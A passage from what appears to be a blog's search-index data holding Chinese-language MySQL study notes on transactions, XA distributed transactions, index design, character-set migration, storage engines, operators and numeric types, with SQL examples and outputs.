在同一个事务中，最好不使用不同存储引擎的表，否则ROLLBACK时需要对非事务类型的表进行特别的处理（继续提交），因为COMMIT，ROLLBACK只能对事务类型的表进行提交和回滚 通常情况下，只对提交的事务记录到二进制日志中，但如果一个事务中包括含非事务类型的表，那么回滚操作也会被记录到二进制日志中，以确保非事务类型表的更新可以被复制到从数据库中。 所有DDL（数据定义语句）是不能回滚的，并且部分的DDL语句会造成隐式提交 在事务中可以通过定义savepoint，指定回滚事务的一个部分，但是不能指定提价事务的一个部分，对于复杂的应用，可以定义多个不同的savepoint，满足不同的条件时，回滚不同的savepoint。如果定义了相同名字的savepoint，则后面定义的savepoint会覆盖之前的定义，对于不再需要使用的savepoint，可以通过release savepoint命令删除savepoint，删除后的savepoint不能再执行rollback to savepoint命令 client 1 client 2 start transaction; insert into t values(1.1); # 可以查询到刚刚插入的记录select * from t; +—–+/ f /+—–+/ 1.1 /+—–+ # 无法查看client1 刚刚插入的记录select * from t; +—–+/ f /+—–+ savepoint test; insert into t values(1.2); # 可以查看刚刚插入的两条数据select * from t; +—–+/ f /+—–+/ 1.1 // 1.2 /+—–+ # 无法查看client1 插入的两条记录select * from t; +—–+/ f /+—–+ # 回滚到刚刚定义的savepoingrollback to savepoint test; # 只能查看到第一条记录，因为第二条记录已经被回滚select * from t; +—–+/ f /+—–+/ 1.1 /+—–+ # 无法查看到结果select * from t; +—–+/ f /+—–+ commit; select * from t; +—–+/ f /+—–+/ 1.1 /+—–+ select * from t; +—–+/ f /+—–+/ 1.1 /+—–+ 分布式事务的使用一个分布式事务会涉及多个行动，这些行动本身是事务性的，所以行动都必须一起成功，或者一起被回滚 分布式事务分布式事务的应用程序设计一个或多个资源管理器和一个事务管理器 资源管理器（RM）用于提供通向食物最远的途径，数据库服务器是一种资源管理器，资源管理器必须能够执行提交或者回滚RM管理的事务。 例如多台MySQL数据库作为多台资源管理器或者几台MySQL服务器和几台Oracle服务器作为资源管理器 事务管理器（TM）用于协调作为一个分布式事务一部分的事务。TM与管理每个事务的RMs进行通行，在一个分布式事务中，各个单个事物均是分布式事务的“分支事务“，分布式事务和各分支通过一种命名方法进行标识 graph TD A(TM) subgraph RM-1 B(RMs) end subgraph RM-2 C(RMs) end subgraph RM-3 D(RMs) end subgraph RM-4 E(RMs) end A --> B A --> C A --> D A --> E E --> A D --> A C --> A B --> A MySQL执行XA MySQL时，MySQL服务器相当于一个用于管理分布式事务中的XA事务的资源管理器， 与MySQL服务器连接的客户端相当于事务管理器。 sequenceDiagram participant TM participant RM1 participant RM2 participant RM3 TM->>RM1: 执行a分支事务 TM->>RM2: 执行b分支事务 TM->>RM3: 执行c分支事务 RM1-->RM1: 执行到事务可以被提交过着回滚状态，记录对于被稳定保存的分支行动，指示是否可以这么做 RM1-->RM2: 执行到事务可以被提交过着回滚状态，记录对于被稳定保存的分支行动，指示是否可以这么做 RM1-->RM3: 执行到事务可以被提交过着回滚状态，记录对于被稳定保存的分支行动，指示是否可以这么做 RM1->>TM: 回复是否可以提交 RM2->>TM: 回复是否可以提交 RM3->>TM: 回复是否可以提交 Note right of TM: 阶段一：预备阶段完成 alt is all commit TM->>RM1: 告知提交 TM->>RM2: 告知提交 TM->>RM3: 告知提交 else is another rollback TM->>RM1: 告知回滚 TM->>RM2: 告知回滚 TM->>RM3: 告知回滚 end Note right of TM: 阶段二：提交阶段完成 在有些情况下一个分布式事务可能会使用一阶段提交。例如：当一个事务管理其发现一个分布式事务只有一个事务资源管理器组成（只有一个分支），则该资源可以被告知同时执行预备和提交 分布式事务的语法分布式的关键在于如何确保分布式事务的完整性，以及在某个分支出现问题是的故障解决。XA的相关命令就是提供给应用如何在多个独立的数据库之间进行分布式事务的管理，包括启动一个分支、使事务进入准备阶段以及事务的实际提交回滚操作等。 12345678910111213# start操作开始后执行的所有XA语法中使用的xid都必须与start中填写的相同，表示对这个启动的XA事务进行操作XA [START\\BEGIN] xid [JOIN|RESUME]# 事务进入PREPARE状态，也就是两个阶段提交的第一个提交阶段XA END xid [SUSPEND [FOR MIGRATE]]XA PREPARE xid# 用来提交或回滚具体的分支事务，也就是第二段提交的第二提交阶段，分支事务被实际的提交或回滚XA COMMIT xid [ONE PHASE]XA ROLLBACK xid# 返回当前数据库中处于PREPARE状态的分支事务的详细些信息XA RECOVER XA START xid用于启动一个带给定xid值的XA事务。每个XA事务必须有一个xid值，因此该值当前不能被其他的XA事务使用。xid是一个XA事务标识符，用来唯一标识一个分布式事务。xid值由客户端提供，或由MySQL服务器生成。 xid包含三个部分: gtrid [, bqual [, formatID ]] gtrid：一个分布式事务标识符，相同的分布式事务应该使用相同的gtrid，这样可以明确知道XA事务属于哪个分布式事务 bqual是一个分布式限定符，默认值是空串，对于一个分布式事务中的每个分支事务bqual值必须是唯一值 formatID是一个数字，用于标识由gtrid和bqual值使用的格式，默认1 1234567891011121314151617# 开启一个分布式事务分布式事务名为test， 分支事务名为db1xa start 'test','db1'; # 插入一条数据insert into t values(111);# 进入prepare状态xa end 'test','db1';xa prepare 'test','db1';# 如果这个时候执行其他的DML语句会报错：(1399, 'XAER_RMFAIL: The command cannot be executed when global transaction is in the PREPARED state')# 查看当前分支事务状态xa recover \\G # 提交分支事务，一旦决定提交分支事务，则所有的分支事务都必须要提价xa commit 'test','db1'; 存在的问题如果分支事务在达到prepare状态时，数据库异常重新启动，服务器重新启动后，可以继续对分支事务进行提交或者回滚操作但是提交的事务没有写binlog，存在一定的隐患，可能导致使用binlog恢复丢失部分数据。如果存在复制的数据库，则可能导致主从数据库的数据不一致。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# 目前表里面有的数据select * from t; +-------+| f |+-------+| 112.0 |+-------+# 启动一个分布式事务xa start 'test'; # 删除里面额数据delete from t where f=112;# 目前数据库中的表中没有数据select f from t; +---+| f |+---+# 数据库进入prepare状态xa end 'test'; xa prepare 'test';# *********************关闭数据库********************select f from t; Reconnecting...(2003, \"Can't connect to MySQL server on 'localhost' ([Errno 111] Connection refused)\")# *********************重新启动数据库*****************# 查看分布式事务依旧存在xa recover \\G ***************************[ 1. row ]***************************formatID | 1gtrid_length | 4bqual_length | 0data | test# 表中的记录并没有被删除select f from t; +-------+| f |+-------+| 112.0 |+-------+# 可以提交或者回滚xa commit 'test';# 提交后数据被删除select f from t; +---+| f |+---+ 最后提交这个分支事务并没有记录到binlog中，但是因为复制和灾难恢复都是依赖于binlog的，所以binlog的缺失会导致复制环境的不同步，以及使用binlog恢复丢失部分数据 如果分支事务的客户端连接异常终止，那么数据库会自动回滚未完成的分支事务，如果此时分支事务已经执行到prepare状态（发送了可以commit消息给TM），那么这个分布式事务的其他分支可能已经成功提交，如果这个分支回滚，可能导致分布式事务不完整，丢失部分分支事务的内容 client 1 client 2 select f from t where f = 1; +—+ / f /+—+ select f from t where f = 1; +—+ / f /+—+ # 开始一个分布式事务xa start ‘test’; insert into t values(1);select f from t where f = 1; +—+ / f /+—+/ 1.0 /+—–+ select f from t where f = 1; +—+ / f /+—+ # 完成第一阶段 xa end ‘test’; xa prepare ‘test’; xa recover \\G***************************[ 1. row ]***************************formatID / 1gtrid_length / 4bqual_length / 0data / test 断开连接 被回滚 # 被异常终止，client2无法查到插入记录,如果此时client2存在分布式事务并且提交成功，会导致分布式事务的不完整select f from t where f = 1; +—+ / f /+—+ 如果分支事务在执行到prepare状态时，数据库异常，且不能再正常启动，需要使用备份和binlog恢复数据，那么那些在prepare状态的分支事务因为并没有记录到binlog，所以不能通过binlog来进行恢复，在数据库回复后，将丢失这部分数据。MySQL5.7.9之后修复了这个严重的问题MySQL完美的分布式事务","path":"2019/09/15/MySQL-事务控制和锁定语句/","date":"09-15","excerpt":"LOCK TABLE &amp; UNLOCK TABLE LOCK TABLE：可以锁定当前线程的表，如果表被其他线程锁定，则当前线程会等待到可以获取锁定为止 UNLOCK TABLE：可以释放当前线程获得的任何锁定， 但是当前线程执行LOCK TABLE其他表的时候或者当前连接被关闭的时候，所有由当前线程锁定的表被隐含的解锁","tags":[]},{"title":"MySQL-索引的设计和使用","text":"索引MySQL的所有列类型都可以被索引，同时索引是提高查找性能的最佳途径。不同的存储引擎可以定义不同的索引数量和索引长度，每种存储引擎对每个表最少支持16个索引，总索引长度至少为256字节MyISAM和InnoDB存储引擎的表默认索引为BTREE索引。同时MyISAM前缀索引支持长度为1000字节， InnoDB前缀索引支持长度为767字节（这里的长度是以字节为单位而不是以字符作单位），MEMORY的默认索引时hash， 但也支持BTREE索引MySQL支持FULLTEXT全文本索引，该索引可以用于全文搜索，全文索引只限于CHAR、VARCHAR、TEXT做索引列，并且是对整个列进行的，不支持局部（前缀）索引。也可以为空间列类型创建索引，但是这个列必须是非空的。123456# 创建索引create index test_c1 on test(c1); # 查询时索引是否被使用explain select * from test where c1 &lt; 2 \\G# 删除索引drop index test_c1 on test; 设计的原则 搜索的索引列，不一定是所要选择的列。最适合索引的列时出现在WHERE字句中的列，或连接字句中指定的列，而不是SELECT后选择列中的列 使用唯一索引，考虑某列中值的分布。索引的列的基数越大，索引的效果越好。例如身份证号码具有不同值，很容易区分各行，而用来记录性别的只含有男女，对此列进行索引没有太多用处，不管搜索男还是女都会回去大约一半的行 使用短索引。在字符串进行索引的时候，能够使用短索引进行区分就不要对整个列进行索引，短索引可以节约大量索引空间，也会使查询速度更快。较小的索引涉及的磁盘IO较少，比较速度更快，索引高速缓存中的块能容纳更多的键值，这样就增加了找到行而不用读取索引中较多块的可能性。 利用最左前缀。创建一个多列索引的时候实际是创建了MySQL可利用的n个索引，多列索引可起几个索引的作用，因为可利用索引中最左边的列集来匹配行。 不要过度索引。索引不是越多越好，每个额外的索引都要占用额外的磁盘空间，并降低写操作的性能，在修改表内容时，索引必须进行更新，有时可能需要重构，因此索引越多，所花费的时间越长，所以只保持所需的索引有利于查询优化 对于InnoDB，记录默认会按照一定的顺序保存，如果有明确定义的主键，则按照主键顺序保存，如果没有主键，但是有唯一索引，那就按照唯一索引的顺序保存，如果既没主键又没唯一索引那么表中会自动生成一个内部列按照这个列的顺序保存。按照主键或者内部列进行的访问是最快的，所以InnoDB要尽量自己指定主键，当表中有几个唯一索引都可以作为主键的时候，选择最常作为条件的列作为主键。InnoDB表的普通索引都会保存主键的键值，所以主键要尽可能选择较短的数据类型，可以有效减少磁盘占用，提高索引的缓存效果BTREE索引与HASH索引HASH： 只用于使用= 或&lt;=&gt;操作符的等式比较（IN也可以） 优化器不能使用hash索引来加速ORDER BY操作 MySQL不能确定两个值之间到底有多少行，如果将一个MyISAM表改为HASH索引的MEMORY表，会影响一些查询的执行效率 只能使用整个关键字来搜索一行 BTREE： 当使用&gt;、&lt;、&gt;=、&lt;=、BETWEEN、!=或者&lt; &gt;,IN或者like ‘pattern{ % }’操作时，都可以使用相关列上的索引 所以当使用HASH索引的时候需要注意SQL语句的编写，确保能够使用上索引","path":"2019/09/14/MySQL-索引的设计和使用/","date":"09-14","excerpt":"索引MySQL的所有列类型都可以被索引，同时索引是提高查找性能的最佳途径。不同的存储引擎可以定义不同的索引数量和索引长度，每种存储引擎对每个表最少支持16个索引，总索引长度至少为256字节MyISAM和InnoDB存储引擎的表默认索引为BTREE索引。同时MyISAM前缀索引支持长度为1000字节， InnoDB前缀索引支持长度为767字节（这里的长度是以字节为单位而不是以字符作单位），MEMORY的默认索引时hash， 但也支持BTREE索引MySQL支持FULLTEXT全文本索引，该索引可以用于全文搜索，全文索引只限于CHAR、VARCHAR、TEXT做索引列，并且是对整个列进行的，不支持局部（前缀）索引。也可以为空间列类型创建索引，但是这个列必须是非空的。123456# 创建索引create index test_c1 on test(c1); # 查询时索引是否被使用explain select * from test where c1 &lt; 2 \\G# 删除索引drop index test_c1 on test;","tags":[]},{"title":"MySQL-字符集设置","text":"命令 作用 show character set; 查看所有可用的字符集以及其默认校对集 select * from CHARACTER_SETS; 查看所有可用的字符集以及其默认校对集 show collation like ‘%name%’; 查看所有字符集拥有的校对集(_ci 大小写不敏感、_cs 大小写敏感、 _bin 二元，比较基于字符编码的值，与language无关) show variables like ‘character_set_server’; 查看当前服务器使用的编码 show variables like ‘character_set_database’; 查看数据库的默认编码 show variables like ‘collation_database’; 查看数据库的默认校对集 show variables like ‘character_set_client’; 查看当前数据库的客户端编码 show variables like ‘character_set_connection 查看当前数据库的连接编码 show variables like ‘character_set_results’; 查看当前数据库的返回结果编码 set names ‘utf8’; 设置上面三个参数的编码（也可以在配置文件my.cnf设置[mysql] default-character-set=utf8 已有数据的数据库修改字符集 12345678910111213141516171819202122# 导出表结构mysqldump -uroot -p --default-character-set=[以什么字符集链接] -d [databasename] &gt; createtab.sql# 手动将结构表中的字符集修改为需要指定的字符集# 导出数据 # --quick 转储大的表，强制mysqldump一次一行的检索，而不是一次性检索，并在输出前缓存在内存中# --extended-insert： 使用包括几个values列的多行insert语法，这样转出文件更小，重载文件是可以加速插入# --no-create-info：不导出建表语句# --default-character-set：按照原有的字符集导出mysqldump -uroot -p --quick --no-create-info --extended-insert --default-character-set=[数据本身字符集] [databasename] &gt; data.sql# 打开data.sql文件， 将所有原来的字符集改为需要更改的字符集# 使用新的字符集创建数据库create databases databasename character set utf8;# 导入表mysql -uroot -p databasename &lt; createtab.sql# 导入数据mysql -uroot -p databasename &lt; data.sql","path":"2019/09/14/MySQL-字符集设置/","date":"09-14","excerpt":"命令 作用 show character set; 查看所有可用的字符集以及其默认校对集 select * from CHARACTER_SETS; 查看所有可用的字符集以及其默认校对集 show collation like ‘%name%’; 查看所有字符集拥有的校对集(_ci 大小写不敏感、_cs 大小写敏感、 _bin 二元，比较基于字符编码的值，与language无关) show variables like ‘character_set_server’; 查看当前服务器使用的编码 show variables like ‘character_set_database’; 查看数据库的默认编码 show variables like ‘collation_database’; 查看数据库的默认校对集 show variables like ‘character_set_client’; 查看当前数据库的客户端编码 show variables like ‘character_set_connection 查看当前数据库的连接编码 show variables like ‘character_set_results’; 查看当前数据库的返回结果编码 set names ‘utf8’; 设置上面三个参数的编码（也可以在配置文件my.cnf设置[mysql] default-character-set=utf8","tags":[]},{"title":"MySQL-存储引擎","text":"存储引擎概述存储引擎包括：MyISAM、InnoDB、BDB、MEMORY、MERGE、EXAMPLE、NDB Cluster、ARCHIVE、CSV、BLACKHOLE、FEDERATED。以上引擎只有InnoDB和BDB提供事务安全表，其他引擎都是非事物安全表 123456789# 查看当前默认存储引擎 5.5.3之后的版本取消了table_type参数show variables like 'table_type';# 5.5.3之后的版本查看默认存储引擎show variables like 'default_storage_engine';# 查看当前数据库支持的存储引擎(方法1)show engines \\G 创建表的时候可以通过engine关键字指定使用的存储引擎 12345create table demo(cid int unsigned not null auto_increment,country varchar(10) not nullprimary key (cid))engine=innodb default charset=utf8; 如果表已经创建需要修改，可以通过alter table语句，将一个已经存在的表修改成其他的存储引擎 1alter table demo engine=myisam; 不同存储引擎的特性 特点 MyISAM InnoDB MEMORY MERGE NDB 存储限制 有 64TB 有 没有 有 事物安全 支持 锁机制 表锁 行锁 表锁 表锁 行锁 B树索引 支持 支持 支持 支持 支持 哈希索引 支持 全文索引 支持 集群索引 支持 数据缓存 支持 支持 索引缓存 支持 支持 支持 支持 支持 数据可压缩 支持 空间使用 低 高 不使用 低 低 内存使用 低 高 中等 低 高 批量插入的速度 高 低 高 高 高 支持外键 支持 MyISAMMyISAM不支持事物，也不支持外键，但是他的优势是访问速度快，对事物完整性没有要求或者以select、insert为主的应用基本上都可以使用这个引擎来创建表 MyISAM在磁盘上存储成三个部分 .frm(存储表定义) .MYD(表数据——my data) .MYI(表索引——my index) 其中MYD文件和MYI文件可以放在不同的目录下，平均分布IO。 通过data directory和index directory可以分别指定文件存储的位置， 这个路径必须是绝对路径 启动mysql的用户拥有个文件路径的权限 指向的路径必能时mysql的datadir的内部路径 DATA DIRECTORY的工作原理是创建符号链接，从表格通常位于（在datadir内）到选项指定的位置。出于安全原因，为避免绕过权限系统，服务器不允许在datadir内部使用符号链接。因此，DATA DIRECTORY不能用于指定datadir内的位置。尝试这样做将导致错误1210（HY000）DATA DIRECTORY的参数不正确。 1234create table testdirectory( id int unsigned primary key auto_increment, name varchar(20) not null )engine=myisam data directory='/home/data' index directory='/home/index' character set utf8; MyISAMl类型的表可能会损坏，损坏后可以通过check table检查MyISAM的健康，并用repair table修复损坏的MyISAM表。 MyISAM支持三种不同的存储格式 静态表（固定长度） 默认存储格式，所有字段都是非变长字段，每个记录都是固定长度，所以存储十分迅速容易缓存，出现故障容易恢复，但是占用空间比动态表多。固定长度是会在存储时按照列宽度定义补充空格，访问时会自动去除这些空格。如果数据尾部本身就带有空格，那么获取时也会自动去除 动态表 记录不是固定长度，占用的空间相对较少，但是频繁的更新和删除记录会产生碎片，需要定期执行optimize table或者myisamchk -r命令来改善性能，并且出现错误时恢复相对比较困难 压缩表 由myisampack工具创建，占据非常小的磁盘空间，因为每个记录是单独被压缩的，所以只有非常小的访问开支 通过alter命令可以修改表的类型 123456alter table TableName row_format = fixed# Fixed 固定表# Dynamic 动态表# 表的类型可以通过以下sql查询select row_format from infomation_schema.tables where table_name = 'TableName'; InnoDBInnoDB提供了提交、回滚和崩溃恢复能力的事物安全。但是相对比MyISAM,InnoDB的处理效率会低一些MyISAM与InnoDB速率对比，并且会占用更多的磁盘空间以保存数据和索引 InnoDB特点 自动增长列 InnoDB表的自动增长列可以手工插入，但是插入的值如果是空或者0，则实际插入的将是自动增长后的值。 12345678910111213141516171819mysql root@localhost:test&gt; create table autoincre_demo( id int unsigned primary key auto_increment, name varchar(10) )engine=innodb character set utf8; Query OK, 0 rows affectedTime: 0.021smysql root@localhost:test&gt; insert into autoincre_demo values(1,'1'),(0,'2'),(null, '3');Query OK, 3 rows affectedTime: 0.015smysql root@localhost:test&gt; select id, name from autoincre_demo;+----+------+| id | name |+----+------+| 1 | 1 || 2 | 2 || 3 | 3 |+----+------+ 同时， 可以通过alter table [table_name] auto_increment=n强制设置自动增长列的初始值，默认从1开始，但是该强制的默认值时保留在内存中的，如果该值在使用之前数据库重新启动，那么这个强制的默认值就会丢失。同时可以通last_insert_id查询当前线程最后插入记录使用的值。如果一次插入了多条记录，那么返回的是第一条记录使用的自动增长值。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# last_insert_id函数使用mysql root@localhost:test&gt; insert into autoincre_demo(name) values('1'); Query OK, 1 row affectedTime: 0.009smysql root@localhost:test&gt; select * from autoincre_demo; +----+------+| id | name |+----+------+| 1 | 1 |+----+------+1 row in setTime: 0.008smysql root@localhost:test&gt; select last_insert_id(); +------------------+| last_insert_id() |+------------------+| 1 |+------------------+1 row in setTime: 0.012smysql root@localhost:test&gt; insert into autoincre_demo(name) values('2'),('3'),('4'); Query OK, 3 rows affectedTime: 0.009smysql root@localhost:test&gt; select last_insert_id();+------------------+| last_insert_id() |+------------------+| 2 |+------------------+1 row in setTime: 0.012s# 通过alter修改的auto_increment id值必须大于数据中最大的id值，否则修改无效mysql root@localhost:test&gt; alter table autoincre_demo auto_increment=2; Query OK, 0 rows affectedTime: 0.011smysql root@localhost:test&gt; insert into autoincre_demo(name) values('2'); Query OK, 1 row affectedTime: 0.009smysql root@localhost:test&gt; select last_insert_id(); +------------------+| last_insert_id() |+------------------+| 5 |+------------------+1 row in setTime: 0.012smysql root@localhost:test&gt; alter table autoincre_demo auto_increment=10; Query OK, 0 rows affectedTime: 0.004smysql root@localhost:test&gt; insert into autoincre_demo(name) values('10'); Query OK, 1 row affectedTime: 0.003smysql root@localhost:test&gt; select last_insert_id();+------------------+| last_insert_id() |+------------------+| 10 |+------------------+1 row in setTime: 0.011s 自动增长列必须是索引，InnoDB中如果是组合索引，也必须是组合索引的第一列，MyISAM则可以是组合索引的其他列。插入记录后自动增长列是按照组合索引的前面几列进行排序后递增的。例如MyISAM类型的表自动增长列为组合索引的第二列，对该表插入记录后可以发现自动增长列是按照组合索引的第一列进行排序后递增的 1234567891011121314151617181920212223242526mysql root@localhost:test&gt; create table autoincre_demo( d1 smallint unsigned not null auto_increment, d2 smallint unsigned not null, name varchar(10), index(d2, d1) )engine=myisam character set utf8; Query OK, 0 rows affectedTime: 0.010smysql root@localhost:test&gt; insert into autoincre_demo(d2,name) values(2,'2'),(3,'3'),(4,'4'),(2,'2'),(3,'3'),(4,'4'); Query OK, 6 rows affectedTime: 0.008smysql root@localhost:test&gt; select * from autoincre_demo; +----+----+------+| d1 | d2 | name |+----+----+------+| 1 | 2 | 2 || 1 | 3 | 3 || 1 | 4 | 4 || 2 | 2 | 2 || 2 | 3 | 3 || 2 | 4 | 4 |+----+----+------+6 rows in setTime: 0.012s 外键约束 支持外键约束的只有InnoDB 。在创建外键的时候，要求父表必须有对应的索引，子表在创建外键的时候也会自动创建对应索引。 1234567891011121314151617181920create table country( country_id smallint unsigned not null auto_increment, country varchar(50) not null, last_update timestamp not null default current_timestamp o n update current_timestamp, primary key (country_id) )engine=innodb default charset=utf8; create table city( city_id smallint unsigned not null auto_increment, city varchar(20) not null, country_id smallint unsigned not null, last_update timestamp not null default current_timestamp o n update current_timestamp, primary key(city_id), key idx_fk_country_id(country_id), constraint fk_city_country foreign key(country_id) references country (country_id) on delete restrict on update cascade ) engine=innodb default charset=utf8; 创建索引时，可以指定在删除、更新父表时，对字表进行的对应操作，包括RESTRICT、CASCADE、SET NULL、 NO ACTION。 字段名 作用 RESTRICT、NO ACTION 在子表有关联记录的情况下，父表不能更新 CASCADE 父表更新或者删除时更新或者删除子表对应记录 SET NULL 父表更新或者删除的时候子表的对应字段设置为NULL 在导入多个表数据时， 如果需要忽略表之前的导入顺序，可以暂时关闭外键检查，同样执行LOAD DATE 和ALTER TABLE操作时可以通过暂时关闭外键约束来加快处理速度。 12345# 关闭set foreign_key_checks=0;# 开启set foreign_key_checks=1; 存储方式 InnoDB存储表和索引的方式有两种方式 共享表空间存储，这种方式穿件的表的表结构保存在.frm文件中，数据和索引保存在innodb_data_home_dir和innodb_data_file_path定义的表空间中，可以是多个文件 使用多表空间存储， 这种方式穿件的表的表结构保存在.frm文件中，但是每个表的数据和索引单独保存在.ibd中。如果是个分区表，则每个分区对应单独的.ibd文件，文件名是表名+文件名，可以在创建分区的时候指定每个分区的数据文件的位置，以此来将表的IO均匀分布在多个磁盘上 使用多表空间的存储方式，需要设置参数innodb_file_per_table并且重新启动服务后才可以生效。对于新建的表，按照多表空间的方式创建，但是已有的表仍然使用共享表空间存储。如果将已有的多表空间改回共享表空间，则新建表会在共享表空间中创建，当已有的多表空间仍然以多表空间存储。 多表空间参数生效仅仅对于后面新建的表，对于已经存在的表不受影响 即使在多表空间下，共享表空间仍然是必须的，InnoDB把内部数据字典和在线重做日志放在这个文件中 多表空间的数据文件没有大小限制，不需要设置初始大小，也不需要设置文件的最大限制、扩展大小参数。 对于使用多表空间特性的表，可以比较方便进行单表备份与恢复，但是直接复制.ibd文件是不行的，因为没有共享表空间的数据字典信息。通过alter table TABLE_NAME discard tablespace;、alter table TABLE_NAME import tablespace;将备份恢复到数据库，但是这样的单表备份只能恢复到原来表所在的数据库中，而不能恢复到其他数据库中。 如果需要进行其他数据库的备份需要通过mysqldump和mysqlimport实现。 MEMORY使用内存中的内容来创建表。每个表只对应一个磁盘文件，格式为.frm。MEMORY表因为数据存储在内存中， 所以访问非常快，默认使用HASH引擎，但是数据只存在于这次服务器运行期间，重启后消失。 123create table tab_memory engine=memory select city_id, city, country_id from city group by city_id; 创建索引时可以指定使用hash索引或者时b-tree索引 12345# 使用hash索引create index mem_hash using hash on tab_memory (city_id);# 使用btree索引create index mem_btree using btree on tab_memory (country_id); 在启动MySQL服务的时候使用--init-file选项可以把insert into ... select 或者load data infile这样的语句放入这个文件，这样就可以在服务启动的时候从持久稳固的数据源装载。 如果不需要MEMORY表中的数据后可以delete from、truncate table清除数据，或者直接drop table整表 每个MEMORY表中可放置的数据大小受max_heap_table_size系统变量的约束，这个变量初始值是16MB， 同时可以在创建表的时候使用MAX_ROWS子句指定表的最大行数 您计划在表中存储的最大行数。这不是硬限制，而是存储引擎的提示，表必须能够存储至少这么多行。 重要从NDB Cluster 7.5.4开始，不推荐使用MAX_ROWS和NDB表来控制表分区的数量。它在以后的版本中仍然受支持以实现向后兼容性，但在将来的版本中可能会被删除。请改用PARTITION_BALANCE;请参阅设置NDB_TABLE选项。NDB 存储引擎将此值视为最大值。如果您计划创建非常大的NDB Cluster表（包含数百万行），则应使用此选项以确保 NDB通过设置 MAX_ROWS = 2 * rows 在哈希表中分配足够数量的索引槽用于存储表主键的哈希值，其中 rows 是您希望插入表中的行数。 最大 MAX_ROWS 值为4294967295;较大的值被截断为此限制。 MEMORY主要用于哪些内容变化不频繁的代码表，或者作为统计操作的中间表，便于高效的对中间表结果进行分析，并得到最终的统计结果。 MERGEmerge是一组MyISAM表组合，这些MyISAM表必须结构完全相同，MERGE本省没有数据，对MERGE表的操作实际上是操作内部的MyISAM表进行的，对于MERGE类型的插入操作，是通过insert_metho子句 定义插入的表，可以有3个不同的值，使用first或last值使插入操作被作用于第一个或者最后一个表上，不定义或者定义为no，表示不能对这个MERGE表执行插入操作 对MERGE表进行DROP操作，这个操作只是删除MERGE的定义，对内部的表没有任何影响。 MERGE表在磁盘上保留两个文件fim文件存储 定义，.mrg包含组合表信息（包括由那些表组成，插入新的数据时的依据。）可以通过修改.mrg文件来修改MERGE表，但是修改后需要flush tables刷新 1234567891011121314151617181920212223242526create table payment_2006( country_id smallint, payment_date datetime, amount decimal(15, 2), key idx_fx_country_id(country_id) )engine=myisam; Query OK, 0 rows affectedTime: 0.010screate table payment_2007( country_id smallint, payment_date datetime, amount decimal(15, 2), key idx_fx_country_id(country_id) )engine=myisam; Query OK, 0 rows affectedTime: 0.010s# 建立MERGE表， 当payment_2006, payment_2007表中修改数据的时候， payment_all表也会随之更改create table payment_all( country_id smallint, payment_date datetime, amount decimal(15, 2), index(country_id) )engine=merge union=(payment_2006,payment_2007) insert_method=last; 不同存储引擎适用场景 MyISAM：适合读操作和插入操作为主，只有很少的更新删除操作，并且对事物的完整性、并发性要求不是很高。 InnoDB：用于事务处理应用程序，支持外键。适合对事务的完整性有比较高的要求，并且在并发条件下要求数据的一致性，数据操作除了插入和查询外还包括很多的更新、删除。InnoDB有效降低了由于删除和更新导致的锁定，可以确保事务的完整提交和回滚。 MEMORY：对于需要快速定位记录和其他类似数据的环境下可以提供极快的访问，但是对表的大小有限制，太大的表无法缓存在缓存内，使用MEMORY需要确保数据可以在重启后恢复。适用于更新不太频繁的小表。 MERGE：将一系列等同的MyISAM以逻辑的方式组合在一起，可以突破单个MyISAM的大小限制，通过表分布在多个磁盘上，可以有效改善MERGE表的访问效率。","path":"2019/09/13/MySQL-存储引擎/","date":"09-13","excerpt":"存储引擎概述存储引擎包括：MyISAM、InnoDB、BDB、MEMORY、MERGE、EXAMPLE、NDB Cluster、ARCHIVE、CSV、BLACKHOLE、FEDERATED。以上引擎只有InnoDB和BDB提供事务安全表，其他引擎都是非事物安全表","tags":[]},{"title":"MySQL-运算符","text":"算数运算符 运算符 作用 + 加 - 减 * 乘 /，div 除 %，mod 余 比较运算符 运算符 作用 = 等于 &lt;&gt;或!= 不等于 &lt;=&gt; null安全的等于 &lt; 小于 &lt;= 小于等于 &gt; 大于 =&gt; 大于等于 between 存在于指定范围 in 存在于指定集合 is null 为null is not null 不为null like 通配符匹配 regexp 或者 rlike 正则表达式 逻辑运算符 运算符 作用 not 或 ! 逻辑非 and 或 &amp;&amp; 逻辑与 or 或 \\ \\ 逻辑或 xor 逻辑异或 not 和 ! 表示逻辑非，除了not null 返回值为null 其他的判断返回值均由1或者0 and 和 &amp;&amp; 标识逻辑与， 必须都为非null或者非0的时候才能返回1 or 和 || 标识逻辑或，如果有一个1则返回1， 如果都是null则返回null xor标识逻辑异或，任意一个操作数为null返回null， 对于非null的操作， 如果两个的逻辑真假值相异，则返回1，否则返回0 位运算符 运算符 作用 &amp; 位与 \\ 位或 ^ 位异或 ～ 位取反 &gt;&gt; 位右移 &lt;&lt; 位左移 运算符的优先 := ||、OR、 XOR &amp;&amp; 、AND NOT BETWEEN、CASE、WHEN、THEN ELSE =、 &lt;=&gt; 、 &gt;= 、 &gt; 、&lt;=、&lt;&gt;、!=、IS、LIKE、REGEXP、IN | &amp; &lt;&lt;、&gt;&gt; -、+ *、/、DIV、%、MOD ^ -（一元减号）、~（一元比特反转） !","path":"2019/09/13/MySQL-运算符/","date":"09-13","excerpt":"算数运算符 运算符 作用 + 加 - 减 * 乘 /，div 除 %，mod 余 比较运算符 运算符 作用 = 等于 &lt;&gt;或!= 不等于 &lt;=&gt; null安全的等于 &lt; 小于 &lt;= 小于等于 &gt; 大于 =&gt; 大于等于 between 存在于指定范围 in 存在于指定集合 is null 为null is not null 不为null like 通配符匹配 regexp 或者 rlike 正则表达式","tags":[]},{"title":"MySQL-数据类型","text":"数值类型 整数类型 字节 最小值(有符号/无符号) 最大值(有符号/无符号) tinyint 1 -1280 127255 smallint 2 327680 3276765535 mediumint 3 -83886080 838860816777215 int, integer 4 -21474836480 21474836474294967295 bigint 8 -92233720368547758080 922337203685477580718446744073709551615 浮点数类型 字节 最小值 最大值 float 4 ±1.175494351E-38 ±3.402823466E+38 double 8 ±2.2250738585072014E-308 ±1.7976931348623157E+308 定点数类型 字节 描述 dec(m,d)decimal(m,d) M+2 最大取值范围与double相同，给定decimal的有效取值范围由M和D决定 位类型 字节 最小值 最大值 bit(m) 1~8 bit(1) bit(64) 整型数据还支持在类型名称后面的小括号内指定显示宽度，例如int(5)当数值宽度小于5位的时候在数字前面填满宽度，如果不显示置顶宽度则默认为int(11)。一般配合zerofill使用，用0填充，也就是在数字位数不够的空间用字符0填满。 field_name int zerofill 